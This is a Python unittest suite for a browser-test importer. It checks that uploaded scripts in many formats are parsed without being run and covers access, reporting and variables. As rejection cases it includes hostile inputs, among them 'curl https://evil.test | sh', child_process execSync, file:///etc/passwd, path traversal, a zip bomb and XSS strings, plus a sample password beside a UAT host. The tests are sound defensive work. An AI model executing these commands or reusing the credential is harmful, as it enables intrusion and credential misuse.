"""Static import, authoring, export, access and resource-policy regressions."""
import asyncio
import base64
import io
import json
import os
from pathlib import Path
import tempfile
import unittest
from unittest.mock import patch
import zipfile

from tests.bootstrap import ensure_test_env
ensure_test_env()
from fastapi.testclient import TestClient
from app.main import app
from app import library_store
from app.db import Recording, RecordingStep, Run, SessionLocal
from app.script_import import MAX_BYTES, parse_file, parse_bundle
from app.step_runtime import normalize_steps, normalize_step, interpolate, audit_selector


CSV = b'action,selector,value,label\nnavigate,,http://example.test,Open\nfill,#name,Ada,Name\nclick,#go,,Go\nassert_text,#out,"Hello, Ada",Check\n'
PYTHON = b'''from playwright.sync_api import expect\ndef test_greeting(page):\n    page.goto("http://example.test")\n    page.get_by_label("Name").fill("Ada")\n    page.get_by_role("button", name="Continue").click()\n    expect(page.locator("#out")).to_have_text("Hello, Ada")\n'''
JAVASCRIPT = b'''import { test, expect } from '@playwright/test';\ntest('greeting', async ({ page }) => {\n  await page.goto('http://example.test');\n  await page.getByRole('button', { name: 'Continue' }).click();\n  await expect(page.locator('#out')).toHaveText('Hello, Ada');\n});\n'''
BDD = b'''Feature: Greeting\nScenario: Say hello\n Given I open "http://example.test"\n When I fill "#name" with "Ada"\n And I click "#go"\n Then "#out" should equal "Hello, Ada"\n'''


class ImportTests(unittest.TestCase):
    def test_UT_IMP_01_csv_json_roundtrip(self):
        result = parse_file('test.csv', CSV)
        self.assertTrue(result['can_save'], result)
        self.assertEqual(len(result['steps']), 4)
        again = parse_file('steps.json', json.dumps(result['steps']).encode())
        self.assertTrue(again['can_save'])
        self.assertEqual(again['steps'], result['steps'])
        self.assertFalse(result['source_executed'])
        self.assertEqual(result['execution'], 'sequential')

    def test_UT_IMP_02_excel_and_formula_rejection(self):
        from openpyxl import Workbook
        book = Workbook(); sheet = book.active
        sheet.append(['action', 'selector', 'value']); sheet.append(['fill', '#x', 'literal'])
        buffer = io.BytesIO(); book.save(buffer)
        self.assertTrue(parse_file('test.xlsx', buffer.getvalue())['can_save'])
        sheet['C2'] = '=1+2'; buffer = io.BytesIO(); book.save(buffer)
        result = parse_file('test.xlsx', buffer.getvalue())
        self.assertFalse(result['can_save'])
        self.assertIn('formulas', result['diagnostics'][0]['message'])
        sheet['C2'] = 'literal'; book.create_sheet(); buffer = io.BytesIO(); book.save(buffer)
        self.assertFalse(parse_file('multi.xlsx', buffer.getvalue())['can_save'])

    def test_UT_IMP_03_python_static_subset(self):
        result = parse_file('test.py', PYTHON)
        self.assertTrue(result['can_save'], result)
        self.assertEqual(result['steps'][1]['selector']['kind'], 'label')
        self.assertEqual(result['steps'][2]['selector']['name'], 'Continue')
        self.assertEqual(result['steps'][-1]['action'], 'assert_text')

    def test_UT_IMP_04_no_python_execution_or_silent_branches(self):
        with tempfile.TemporaryDirectory() as directory:
            sentinel = Path(directory) / 'owned'
            data = f'import pathlib\npathlib.Path({str(sentinel)!r}).write_text("owned")\npage.click("#x")\n'.encode()
            result = parse_file('evil.py', data)
            self.assertFalse(result['can_save'])
            self.assertFalse(sentinel.exists())
        for code in [b'if True:\n page.click("#x")', b'for i in range(3):\n page.click("#x")', b'page.wait_for_timeout(5000)', b'page.evaluate("alert(1)")', b'page.click("#x", force=True)']:
            self.assertFalse(parse_file('a.py', code)['can_save'], code)

    def test_UT_IMP_05_javascript_typescript_subset(self):
        for ext in ['js', 'ts']:
            result = parse_file('test.' + ext, JAVASCRIPT)
            self.assertTrue(result['can_save'], result)
            self.assertEqual(len(result['steps']), 3)
        self.assertFalse(parse_file('evil.js', b"require('child_process').execSync('id');")['can_save'])
        self.assertFalse(parse_file('two.js', JAVASCRIPT + JAVASCRIPT)['can_save'])
        self.assertFalse(parse_file('option.js', b'await page.click("#x", { force: true });')['can_save'])

    def test_UT_IMP_06_bdd_cucumber_unknown_phrases(self):
        for ext in ['feature', 'bdd']:
            result = parse_file('flow.' + ext, BDD)
            self.assertTrue(result['can_save'], result)
            self.assertEqual(result['steps'][-1]['action'], 'assert_text')
        result = parse_file('custom.feature', BDD + b' And I magically approve all claims\n')
        self.assertFalse(result['can_save'])
        self.assertEqual(result['diagnostics'][0]['line'], 7)
        self.assertFalse(parse_file('outline.feature', b'Scenario Outline: data\n Given I open "<url>"\n')['can_save'])

    def test_UT_IMP_07_jenkins_reference_bundle(self):
        wrapper = b"pipeline { agent any stages { stage('test') { steps { sh 'pytest test_flow.py' } } } }"
        result = parse_bundle([('Jenkinsfile', wrapper), ('test_flow.py', PYTHON)])
        self.assertTrue(result['can_save'], result)
        self.assertEqual(result['wrapper'], 'Jenkinsfile')
        self.assertFalse(result['source_executed'])
        for bad in [wrapper.replace(b'pytest test_flow.py', b'curl https://evil.test | sh'), wrapper.replace(b'agent any', b'agent any post { always { sh "id" } }')]:
            with self.assertRaises(ValueError):
                parse_bundle([('Jenkinsfile', bad), ('test_flow.py', PYTHON)])
        with self.assertRaises(ValueError):
            parse_bundle([('Jenkinsfile', wrapper)])

    def test_UT_IMP_08_limits_and_unknown_formats(self):
        self.assertFalse(parse_file('big.csv', b'x' * (MAX_BYTES + 1))['can_save'])
        self.assertFalse(parse_file('legacy.xls', b'not an xlsx')['can_save'])
        self.assertFalse(parse_file('unknown.csv', b'action,selector,typo\nclick,#x,yes')['can_save'])
        self.assertFalse(parse_file('many.json', json.dumps([{'action':'click','selector':'#x'}] * 501).encode())['can_save'])
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, 'w', compression=zipfile.ZIP_DEFLATED) as z:
            z.writestr('xl/huge.xml', b'0' * (9 * 1024 * 1024))
        self.assertFalse(parse_file('bomb.xlsx', buf.getvalue())['can_save'])

    def test_UT_IMP_09_schema_fail_closed(self):
        invalid = [
            {'action':'click','selector':{'primary':'#x','force':True}},
            {'action':'navigate','value':'file:///etc/passwd'},
            {'action':'navigate','value':'https://user:pass@example.test'},
            {'action':'assert_count','value':'nan','selector':'#x'},
            {'action':'fill','value':'x','selector':'#x','repeat_count':1000},
            {'action':'upload_file','selector':{'primary':'#file','filename':'../../secret','base64':'YQ=='}},
            {'action':'click','selector':{'primary':'#x','timeout_ms':900000}},
            {'action':'api_request','value':'https://example.test','selector':{'method':'CONNECT'}},
        ]
        for step in invalid:
            with self.subTest(step=step), self.assertRaises(ValueError):
                normalize_step(step)
        self.assertEqual(interpolate('{{n}}', {'n': 0}), '0')
        with self.assertRaisesRegex(ValueError, 'Missing variable'):
            interpolate('{{unknown}}', {})

    def test_UT_IMP_10_preview_no_publication_and_save_once(self):
        project = library_store.create_project('Import target', '')
        with TestClient(app) as client, patch.object(library_store, '_finish', return_value=False) as publish:
            result = client.post('/api/imports/preview?filename=flow.csv', content=CSV)
            self.assertEqual(result.status_code, 200, result.text)
            preview = result.json()
            publish.assert_not_called()
            # This unit isolates export/publication from browser execution. The
            # real receipt binding and actual browser gate have separate coverage.
            with patch('app.import_drafts.verified', return_value=({'id':'test-receipt'}, {'steps':preview['steps']})), patch('app.import_drafts.write'):
                response = client.post('/api/imports/save', json={'project_id': project['id'], 'name':'Imported', 'steps':preview['steps'], 'draft_id':'test-receipt'})
            self.assertEqual(response.status_code, 201, response.text)
            self.assertEqual(publish.call_count, 1)
            saved = response.json()
            self.assertEqual(saved['step_count'], 4)
            self.assertIn('publish_message', saved)
            detail = client.get('/api/recordings/' + saved['id']).json()
            self.assertEqual(detail['steps'][-1]['action'], 'assert_text')
            self.assertIn('recording.spec.ts', detail['resources'])
            self.assertIn('testforge_runtime.py', detail['resources'])
            archive = client.get('/api/recordings/' + saved['id'] + '/resources.zip')
            self.assertEqual(archive.status_code, 200)
            with zipfile.ZipFile(io.BytesIO(archive.content)) as z:
                self.assertIn('steps.json', z.namelist())
                self.assertIn('playwright.config.ts', z.namelist())

    def test_UT_IMP_11_invalid_save_is_atomic_and_oversize_is_rejected(self):
        project = library_store.create_project('Rejected imports', '')
        before = library_store.list_recordings(project['id'])
        with TestClient(app) as client:
            response = client.post('/api/imports/save', json={'project_id':project['id'], 'name':'bad', 'steps':[{'action':'shell','value':'id'}]})
            self.assertEqual(response.status_code, 422)
            self.assertEqual(library_store.list_recordings(project['id']), before)
            response = client.post('/api/imports/preview?filename=big.csv', content=b'x'*(MAX_BYTES+1))
            self.assertEqual(response.status_code, 413)
            response = client.post('/api/imports/preview-bundle', json={'files':[{'name':'x','base64':'not_base64!'}]})
            self.assertEqual(response.status_code, 422)

    def test_UT_IMP_12_add_and_edit_assertion(self):
        project = library_store.create_project('Author actions', '')
        rec = library_store.create_recording(project['id'], 'Assertions', '')
        with TestClient(app) as client:
            response = client.post(f"/api/recordings/{rec['id']}/steps", json={'action':'assert_visible','selector':'#x'})
            self.assertEqual(response.status_code, 201, response.text)
            steps = client.get(f"/api/recordings/{rec['id']}").json()['steps']
            response = client.patch(f"/api/recordings/{rec['id']}/steps/{steps[0]['id']}", json={'action':'assert_text','value':'Ready'})
            self.assertEqual(response.status_code, 200, response.text)
            response = client.patch(f"/api/recordings/{rec['id']}/steps/{steps[0]['id']}", json={'selector':{'primary':'#x','force':True}})
            self.assertEqual(response.status_code, 422)

    def test_UT_IMP_13_access_gate_http_and_websocket(self):
        with patch.dict(os.environ, {'TF_ACCESS_TOKEN':'a'*40}), TestClient(app) as client:
            self.assertEqual(client.get('/api/projects').status_code, 401)
            self.assertEqual(client.get('/api/auth/status').json()['mode'], 'single-operator')
            self.assertEqual(client.post('/api/auth/login', json={'token':'wrong'}).status_code, 401)
            self.assertEqual(client.post('/api/auth/login', json={'token':'a'*40}).status_code, 200)
            self.assertTrue(client.get('/api/auth/status').json()['authenticated'])
            self.assertEqual(client.get('/api/projects').status_code, 200)
            self.assertIn('httponly', client.post('/api/auth/login',json={'token':'a'*40}).headers['set-cookie'].lower())
            self.assertEqual(client.post('/api/auth/logout').status_code, 200)
            self.assertEqual(client.get('/api/projects').status_code, 401)
            from starlette.websockets import WebSocketDisconnect
            with self.assertRaises(WebSocketDisconnect):
                with client.websocket_connect('/ws/runs/anything'):
                    pass
            self.assertEqual(client.get('/api/projects',headers={'Authorization':'Bearer '+'a'*40}).status_code,200)
        with patch.dict(os.environ, {'TF_ACCESS_TOKEN':'short'}), TestClient(app) as client:
            self.assertEqual(client.get('/api/projects').status_code, 401)

    def test_UT_IMP_14_login_attempts_are_rate_limited(self):
        from app import access_control
        access_control._LOGIN_ATTEMPTS.clear()
        try:
            with patch.dict(os.environ, {'TF_ACCESS_TOKEN':'b'*40}), TestClient(app) as client:
                for _ in range(access_control.LOGIN_MAX_ATTEMPTS):
                    self.assertEqual(client.post('/api/auth/login', json={'token':'wrong'}).status_code, 401)
                limited = client.post('/api/auth/login', json={'token':'wrong'})
                self.assertEqual(limited.status_code, 429)
                self.assertGreater(int(limited.headers['retry-after']), 0)
        finally:
            access_control._LOGIN_ATTEMPTS.clear()

    def test_UT_IMP_15_portable_reports_escape_target_content(self):
        with SessionLocal() as db:
            row = Run(recording_id='report-only',status='failed',execution_log=[{'order':1,'action':'assert_text','label':'<script>alert(1)</script>','status':'failed','error':'<img onerror=evil>'}])
            db.add(row); db.commit(); rid = row.id
        with TestClient(app) as client:
            response = client.get(f'/api/runs/{rid}/report.html')
            self.assertEqual(response.status_code,200)
            self.assertNotIn('<script>',response.text)
            self.assertIn('&lt;script&gt;',response.text)
            self.assertIn("default-src 'none'",response.headers['content-security-policy'])
            self.assertEqual(client.get(f'/api/runs/{rid}/report.json').json()['status'],'failed')
            self.assertEqual(client.get('/api/runs/unknown/report.html').status_code,404)

    def test_UT_IMP_15_recording_autosave_skips_expensive_exports(self):
        project = library_store.create_project('Cheap autosaves', '')
        rec = library_store.create_recording(project['id'], 'Cheap', '')
        with patch('app.export_formats.write_exports') as exports:
            library_store.export_recording(rec['id'], publish=False, include_exports=False)
            exports.assert_not_called()
            library_store.export_recording(rec['id'], publish=True, include_exports=False)
            exports.assert_called_once()

    def test_UT_IMP_16_sensitive_options_not_duplicated_in_audit(self):
        actual = audit_selector({'primary':'#file','base64':'secret','headers':{'Authorization':'secret'},'body':'secret'})
        self.assertNotIn('secret',json.dumps(actual))
        self.assertEqual(actual['primary'],'#file')

    def test_UT_IMP_17_missing_variable_fails_before_typing(self):
        from app.executor import replay_step
        from tests.fakes import FakePage
        page=FakePage()
        with self.assertRaisesRegex(ValueError,'Missing variable'):
            asyncio.run(replay_step(page,{'action':'type','value':'{{missing}}'},{}))
        self.assertFalse(page.typed)

    def test_UT_IMP_18_resource_policy_defaults(self):
        from app.executor import DEFAULT_BUDGETS
        self.assertEqual(DEFAULT_BUDGETS['type_delay_ms'],0)
        root=Path(__file__).resolve().parents[1]
        html=(root/'app/static/index.html').read_text()
        self.assertNotIn('cdn.tailwindcss.com',html)
        self.assertNotIn('unpkg.com',html)
        self.assertIn('localStorage.getItem("tf_live_window") === "1"',html)
        config=(root/'app/export_templates.py').read_text()
        self.assertIn('workers: 1',config)
        self.assertIn('fullyParallel: false',config)

    def test_UT_IMP_19_tags_parent_tree_and_filters(self):
        from app.main import _select_batch_recordings
        project=library_store.create_project('Tagging', '')
        parent=library_store.create_recording(project['id'],'Parent','')
        child=library_store.create_recording(project['id'],'Child','')
        with TestClient(app) as client:
            response=client.patch(f"/api/recordings/{child['id']}/metadata",json={'tags':'Smoke, Checkout','parent_id':parent['id']})
            self.assertEqual(response.status_code,200,response.text)
            self.assertEqual(response.json()['tags'],'checkout,smoke')
            rows=client.get(f"/api/projects/{project['id']}/recordings").json()
            match=next(r for r in rows if r['id']==child['id'])
            self.assertEqual(match['parent_id'],parent['id'])
            self.assertEqual(match['tags'],'checkout,smoke')
            selected,_=_select_batch_recordings({'project_id':project['id'],'include_tags':['smoke']})
            self.assertEqual([r['id'] for r in selected],[child['id']])
            selected,_=_select_batch_recordings({'project_id':project['id'],'include_tags':['smoke'],'exclude_tags':['checkout']})
            self.assertEqual(selected,[])
            response=client.patch(f"/api/recordings/{parent['id']}/metadata",json={'parent_id':child['id']})
            self.assertEqual(response.status_code,422)
            self.assertIsNone(library_store.get_recording(parent['id'])['parent_id'])

    def test_UT_IMP_20_live_recording_reads_current_steps_without_export(self):
        from app import recorder
        project=library_store.create_project('Live view', '')
        rec=library_store.create_recording(project['id'],'Live','')
        with SessionLocal() as db:
            db.add(RecordingStep(recording_id=rec['id'],order=1,action='press',value='Enter'))
            db.commit()
        session=object()
        with patch.dict(recorder.SESSIONS,{rec['id']:session}), TestClient(app) as client:
            result=client.get(f"/api/recordings/{rec['id']}").json()
            self.assertEqual(result['source'],'live')
            self.assertEqual(result['steps'][0]['action'],'press')
            self.assertTrue(result['exports_pending'])
        self.assertEqual(library_store.get_recording(rec['id'])['steps'],[])

    def test_UT_IMP_21_schema_version_and_literal_js_option(self):
        step=normalize_step({'action':'click','selector':'#x'})
        self.assertEqual(step['selector']['schema_version'],1)
        with self.assertRaisesRegex(ValueError,'schema_version'):
            normalize_step({'action':'click','selector':{'primary':'#x','schema_version':2}})
        result=parse_file('a.js',b"await page.getByRole('button', { name: 'true value' }).click();")
        self.assertTrue(result['can_save'],result)
        self.assertEqual(result['steps'][0]['selector']['name'],'true value')

    def test_UT_IMP_22_websocket_disconnect_releases_idle_sender(self):
        from app.main import _forward_events
        class Disconnected:
            async def receive(self): return {'type':'websocket.disconnect'}
            async def send_json(self, event): pass
        async def exercise():
            await asyncio.wait_for(_forward_events(Disconnected(),asyncio.Queue()),1)
            self.assertEqual(len(asyncio.all_tasks()),1)
        asyncio.run(exercise())

    def test_UT_IMP_23_subscriber_queues_and_counts_are_bounded(self):
        from app.main import RUN_STREAMS,_subscribe_events,broadcast_run
        key='bounded-test'
        async def exercise():
            try:
                queue=_subscribe_events(key)
                for _ in range(3): self.assertIsNotNone(_subscribe_events(key))
                self.assertIsNone(_subscribe_events(key))
                for i in range(100): await broadcast_run(key,{'type':'step','order':i})
                await broadcast_run(key,{'type':'done'})
                self.assertLessEqual(queue.qsize(),8)
                events=[]
                while not queue.empty(): events.append(queue.get_nowait())
                self.assertEqual(events[-1]['type'],'done')
            finally:
                RUN_STREAMS.pop(key,None)
        asyncio.run(exercise())


TXT_STEPS = b"""Test Case: Replenishment login
Preconditions: UAT user with store access
1. Open https://harrisfarm-uat.sandbox.operations.dynamics.com/?cmp=hfm&storeNo=426
2. Enter {{user}} in the Username field
3. Type Spring2026! in the Password field
4. Click the Sign in button
5. Verify the page contains Welcome
"""


class ImportFormatTests(unittest.TestCase):
    """Every market format the upload box accepts (UT_IMP_24 onwards)."""

    def test_UT_IMP_24_plain_text_steps_and_parameters(self):
        result = parse_file('login.txt', TXT_STEPS)
        self.assertTrue(result['can_save'], result['diagnostics'])
        self.assertEqual(result['detected']['format'], 'text')
        self.assertEqual(result['steps'][0]['action'], 'navigate')
        self.assertEqual(result['steps'][1]['selector']['primary'], 'Username')
        self.assertEqual(result['steps'][1]['value'], '{{user}}')
        self.assertFalse(result['source_executed'])

    def test_UT_IMP_25_markdown_pipe_table(self):
        markdown = b"""# Login
Precondition: UAT available

| Step | Action | Expected Result |
| --- | --- | --- |
| 1 | Open https://example.test | Sign-in form appears |
| 2 | Enter {{user}} in the Username field | |
| 3 | Click the Sign in button | Dashboard loads |
"""
        result = parse_file('login.md', markdown)
        self.assertTrue(result['can_save'], result['diagnostics'])
        self.assertEqual(result['detected']['format'], 'table')
        actions = [step['action'] for step in result['steps']]
        # Each row contributes its own expectation, kept in sheet order.
        self.assertEqual(actions, ['navigate', 'assert_contains', 'fill', 'click', 'assert_contains'])
        self.assertEqual(result['steps'][2]['value'], '{{user}}')

    def test_UT_IMP_26_market_headers_and_metadata_columns(self):
        azure = b"""Test Case,Step,Action,Expected Result,Priority
Replenishment,1,Open https://example.test,Launch pad is displayed,1
Replenishment,2,Enter Ada in the Username field,,1
"""
        result = parse_file('azdo.csv', azure)
        self.assertTrue(result['can_save'], result['diagnostics'])
        self.assertTrue(any(d['severity'] == 'note' for d in result['diagnostics']))
        self.assertEqual(result['steps'][0]['action'], 'navigate')

    def test_UT_IMP_27_two_test_cases_in_one_sheet_is_refused(self):
        table = b"""Test Case,Step,Action
Login,1,Click the Sign in button
Logout,1,Click the Sign out button
"""
        result = parse_file('two.csv', table)
        self.assertFalse(result['can_save'])
        self.assertTrue(any('test case' in d['message'].lower() for d in result['diagnostics']))

    def test_UT_IMP_28_psv_and_tsv_delimiters(self):
        psv = b'action|selector|value\nnavigate||https://example.test\nclick|#go|\n'
        result = parse_file('steps.psv', psv)
        self.assertTrue(result['can_save'], result['diagnostics'])
        self.assertEqual([step['action'] for step in result['steps']], ['navigate', 'click'])

    def test_UT_IMP_29_selenium_ide_side(self):
        side = json.dumps({'id': 'suite', 'tests': [{'name': 'Login', 'commands': [
            {'command': 'open', 'target': '/login', 'value': ''},
            {'command': 'type', 'target': '#txtUser', 'value': '{{user}}'},
            {'command': 'assertText', 'target': '//h1', 'value': 'Welcome'},
            {'command': 'pause', 'target': '5000', 'value': ''}]}]}).encode()
        result = parse_file('login.side', side)
        # A fixed pause is refused, exactly like Thread.sleep: the rest still imports.
        self.assertFalse(result['can_save'])
        self.assertEqual(result['steps'][0]['value'], '{{base_url}}/login')
        self.assertTrue(any('Fixed sleeps' in d['message'] for d in result['diagnostics']))
        without_pause = json.dumps({'id': 'suite', 'tests': [{'name': 'Login', 'commands': side and [
            {'command': 'open', 'target': '/login', 'value': ''},
            {'command': 'type', 'target': '#txtUser', 'value': '{{user}}'}]}]}).encode()
        self.assertTrue(parse_file('login.side', without_pause)['can_save'])

    def test_UT_IMP_30_postman_collection(self):
        collection = json.dumps({'info': {'name': 'Store API', 'schema': 'https://schema.getpostman.com/json/collection/v2.1.0/collection.json'},
            'item': [{'name': 'Get stores', 'request': {'method': 'GET', 'url': {'raw': 'https://api.example.test/stores?storeNo=426'}},
                      'event': [{'listen': 'test', 'script': {'exec': ['pm.response.to.have.status(200);']}}]}]}).encode()
        result = parse_file('store.postman_collection.json', collection)
        self.assertTrue(result['can_save'], result['diagnostics'])
        self.assertEqual(result['steps'][0]['action'], 'api_request')
        self.assertEqual(result['steps'][0]['value'], 'https://api.example.test/stores?storeNo=426')

    def test_UT_IMP_31_robot_framework(self):
        robot = b"""*** Settings ***
Documentation   Login smoke
*** Variables ***
${USER}    Ada
*** Test Cases ***
Store login
    Open Browser    https://example.test/login    chromium
    Input Text    id=txtUser    ${USER}
    Click Button    Sign in
    Page Should Contain    Dashboard
"""
        result = parse_file('login.robot', robot)
        self.assertTrue(result['can_save'], result['diagnostics'])
        self.assertEqual(result['detected']['format'], 'robot')
        self.assertEqual(result['steps'][1]['value'], '{{USER}}')
        self.assertTrue(result['variable_suggestions'])

    def test_UT_IMP_32_cypress_spec_not_reported_as_playwright(self):
        cypress = b"""describe('login', () => {
  it('signs in', () => {
    cy.visit('/login');
    cy.get('#txtUser').type('{{user}}');
    cy.get('button').contains('Sign in').click();
    cy.url().should('include', '/dashboard');
  });
});"""
        result = parse_file('login.cy.js', cypress)
        self.assertTrue(result['can_save'], result['diagnostics'])
        self.assertEqual(result['detected']['why'], 'Cypress spec (cy.* commands)')
        self.assertEqual(result['steps'][2]['selector']['kind'], 'text')

    def test_UT_IMP_33_java_and_csharp_subset(self):
        java = b"""public class LoginTest {
  @Test
  public void login() {
    driver.get("https://example.test/login");
    driver.findElement(By.Id("txtUser")).sendKeys("{{user}}");
    driver.findElement(By.XPath("//button[text()='Sign in']")).click();
    Assert.assertEquals("Welcome", driver.findElement(By.Id("hdr")).getText());
    Thread.sleep(3000);
  }
}"""
        result = parse_file('LoginTest.java', java)
        self.assertFalse(result['can_save'])
        self.assertTrue(any('Fixed sleeps' in d['message'] for d in result['diagnostics']))
        self.assertEqual(result['detected']['format'], 'java')
        plain = java.replace(b'    Thread.sleep(3000);\n', b'')
        self.assertTrue(parse_file('LoginTest.java', plain)['can_save'])

    def test_UT_IMP_34_word_document_tables(self):
        document = ['<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>',
                    '<w:p><w:r><w:t>Test case: Login</w:t></w:r></w:p>']
        rows = [['Step', 'Action', 'Expected Result'], ['1', 'Open https://example.test', 'Login page'],
                ['2', 'Click the Sign in button', 'Dashboard']]
        document.append('<w:tbl>' + ''.join('<w:tr>' + ''.join('<w:tc><w:p><w:r><w:t>%s</w:t></w:r></w:p></w:tc>' % cell for cell in row) + '</w:tr>' for row in rows) + '</w:tbl>')
        document.append('</w:body></w:document>')
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, 'w') as archive:
            archive.writestr('word/document.xml', ''.join(document))
        result = parse_file('login.docx', buffer.getvalue())
        self.assertTrue(result['can_save'], result['diagnostics'])
        self.assertEqual(result['detected']['format'], 'docx')
        macros = io.BytesIO()
        with zipfile.ZipFile(macros, 'w') as archive:
            archive.writestr('word/document.xml', ''.join(document))
            archive.writestr('word/vbaProject.bin', b'\x00')
        self.assertFalse(parse_file('login.docm', macros.getvalue())['can_save'])

    def test_UT_IMP_35_yaml_and_xml_step_lists(self):
        yaml_source = b"""name: Login smoke
variables:
  user: Ada
steps:
  - action: navigate
    value: https://example.test/login
  - Click the Sign in button
"""
        result = parse_file('login.yaml', yaml_source)
        self.assertTrue(result['can_save'], result['diagnostics'])
        self.assertEqual(result['detected']['format'], 'yaml')
        xml_source = b'<suite><testcase name="Open https://example.test"/><testcase name="Click the Sign in button"/></suite>'
        xml_result = parse_file('cases.xml', xml_source)
        self.assertTrue(xml_result['can_save'], xml_result['diagnostics'])
        self.assertEqual(xml_result['steps'][0]['action'], 'navigate')

    def test_UT_IMP_36_har_capture_and_sniffing(self):
        har = json.dumps({'log': {'entries': [
            {'request': {'method': 'GET', 'url': 'https://example.test/login', 'headers': []}, 'response': {'content': {'mimeType': 'text/html'}}},
            {'request': {'method': 'GET', 'url': 'https://example.test/api/stores', 'headers': [{'name': 'Cookie', 'value': 'secret'}, {'name': 'Accept', 'value': 'application/json'}]},
             'response': {'content': {'mimeType': 'application/json'}}}]}}).encode()
        result = parse_file('capture.har', har)
        self.assertTrue(result['can_save'], result['diagnostics'])
        self.assertEqual(result['detected']['format'], 'har')
        self.assertEqual([step['action'] for step in result['steps']], ['navigate', 'api_request'])
        # An unknown extension is sniffed rather than refused.
        sniffed = parse_file('steps.weird', TXT_STEPS)
        self.assertTrue(sniffed['can_save'], sniffed['diagnostics'])
        self.assertEqual(sniffed['detected']['format'], 'text')

    def test_UT_IMP_37_html_page_and_legacy_suite(self):
        page = (b'<html><body><h1>Login</h1><p>Open https://example.test</p>'
                b'<p>Enter {{user}} in the Username field</p>'
                b'<p>Click the Sign in button</p><p>Verify the page contains Welcome</p></body></html>')
        result = parse_file('steps.html', page)
        self.assertTrue(result['can_save'], result['diagnostics'])
        self.assertEqual([step['action'] for step in result['steps']][:3], ['navigate', 'fill', 'click'])
        suite = (b'<html><body><table><tr><th>Command</th><th>Target</th><th>Value</th></tr>'
                 b'<tr><td>open</td><td>https://example.test</td><td></td></tr>'
                 b'<tr><td>click</td><td>Sign in</td><td></td></tr></table></body></html>')
        suite_result = parse_file('suite.html', suite)
        self.assertTrue(suite_result['can_save'], suite_result['diagnostics'])
        self.assertEqual(suite_result['steps'][0]['action'], 'navigate')

    def test_UT_IMP_38_error_blocks_but_note_does_not(self):
        result = parse_file('mixed.txt', b"""1. Open https://example.test
2. Upload the invoice file
3. Click the Submit button
""")
        severities = {d['severity'] for d in result['diagnostics']}
        self.assertIn('error', severities)
        self.assertFalse(result['can_save'])
        self.assertEqual(result['steps'][0]['action'], 'navigate')


class VariableOnboardingTests(unittest.TestCase):
    """Literals become reusable variables; the reviewer decides (UT_IMP_39+)."""

    def test_UT_IMP_39_plan_names_values_after_their_field(self):
        from app import variables_ai
        steps = [{'id': 'a', 'order': 1, 'action': 'fill', 'value': 'Ada.Lovelace', 'selector': {'label': 'Username'}},
                 {'id': 'b', 'order': 2, 'action': 'fill', 'value': 'Spring2026!', 'selector': {'label': 'Password'}},
                 {'id': 'c', 'order': 3, 'action': 'assert_contains', 'value': 'Welcome Ada.Lovelace', 'selector': {'primary': 'body'}}]
        plan = variables_ai.plan(steps)
        names = {item['name'] for item in plan['candidates']}
        self.assertIn('username', names)
        self.assertIn('password', names)
        secret = next(item for item in plan['candidates'] if item['name'] == 'password')
        self.assertTrue(secret['is_secret'])
        self.assertEqual(secret['category'], 'Auth')
        # The expectation follows the same variable rather than duplicating the literal.
        steps_out, created, _reused = variables_ai.apply(steps, [{'name': item['name'], 'value': item['value'],
                                                                  'is_secret': item['is_secret'], 'category': item['category']}
                                                                 for item in plan['candidates']])
        self.assertEqual(steps_out[0]['value'], '{{username}}')
        self.assertEqual(steps_out[2]['value'], 'Welcome {{username}}')
        self.assertEqual({item['name'] for item in created}, {'username', 'password'})

    def test_UT_IMP_40_repeated_literal_reuses_one_variable_and_url_query(self):
        from app import variables_ai
        steps = [{'id': 'a', 'order': 1, 'action': 'navigate', 'value': 'https://example.test/login?storeNo=426', 'selector': {}},
                 {'id': 'b', 'order': 2, 'action': 'fill', 'value': '426', 'selector': {'label': 'Store number'}},
                 {'id': 'c', 'order': 3, 'action': 'fill', 'value': '426', 'selector': {'label': 'Store number'}}]
        plan = variables_ai.plan(steps)
        # One literal, one variable, three usages: the URL query and both fields.
        self.assertEqual(plan['count'], 1)
        store = next(item for item in plan['candidates'] if item['value'] == '426')
        self.assertEqual(store['usages_count'], 3)
        steps_out, _created, _reused = variables_ai.apply(steps, [{'name': item['name'], 'value': item['value']} for item in plan['candidates']])
        self.assertIn('storeNo={{storeno}}', steps_out[0]['value'])
        self.assertEqual(steps_out[1]['value'], '{{storeno}}')

    def test_UT_IMP_41_invalid_names_and_placeholders_are_left_alone(self):
        from app import variables_ai
        steps = [{'id': 'a', 'order': 1, 'action': 'fill', 'value': '{{user}}', 'selector': {'label': 'Username'}},
                 {'id': 'b', 'order': 2, 'action': 'press', 'value': 'Enter', 'selector': {}}]
        self.assertEqual(variables_ai.plan(steps)['count'], 0)
        with self.assertRaises(ValueError):
            variables_ai.apply(steps, [{'name': 'bad name', 'value': 'Ada'}])

    def test_UT_IMP_42_recording_endpoints_onboard_variables(self):
        client = TestClient(app)
        project = client.post('/api/projects', json={'name': 'Onboard', 'base_url': 'https://example.test'}).json()
        recording = client.post('/api/recordings', json={'project_id': project['id'], 'name': 'Login', 'start_url': 'https://example.test'}).json()
        with SessionLocal() as db:
            db.add(RecordingStep(recording_id=recording['id'], order=1, action='fill', value='Ada',
                                 label='Name', selector={'label': 'Username'}))
            db.commit()
        plan = client.post(f"/api/recordings/{recording['id']}/variable-plan", json={})
        self.assertEqual(plan.status_code, 200, plan.text)
        candidates = plan.json()['candidates']
        self.assertEqual([item['name'] for item in candidates], ['username'])
        applied = client.post(f"/api/recordings/{recording['id']}/variables",
                              json={'assignments': [{'name': 'username', 'value': 'Ada'}]})
        self.assertEqual(applied.status_code, 200, applied.text)
        self.assertEqual(applied.json()['counts'], {'steps_changed': 1, 'variables_created': 1, 'variables_reused': 0})
        with SessionLocal() as db:
            step = db.query(RecordingStep).filter_by(recording_id=recording['id']).first()
            self.assertEqual(step.value, '{{username}}')
        # Applying twice is a no-op, not a duplicate variable (the recorder may retry).
        again = client.post(f"/api/recordings/{recording['id']}/variables", json={'assignments': [{'name': 'username', 'value': 'Ada'}]})
        self.assertEqual(again.status_code, 200, again.text)
        self.assertEqual(again.json()['counts'], {'steps_changed': 0, 'variables_created': 0, 'variables_reused': 0})

    def test_UT_IMP_43_import_variable_endpoints(self):
        client = TestClient(app)
        steps = [{'order': 1, 'action': 'fill', 'value': 'Ada', 'selector': {'label': 'Username'}}]
        plan = client.post('/api/imports/variable-plan', json={'steps': steps})
        self.assertEqual(plan.status_code, 200, plan.text)
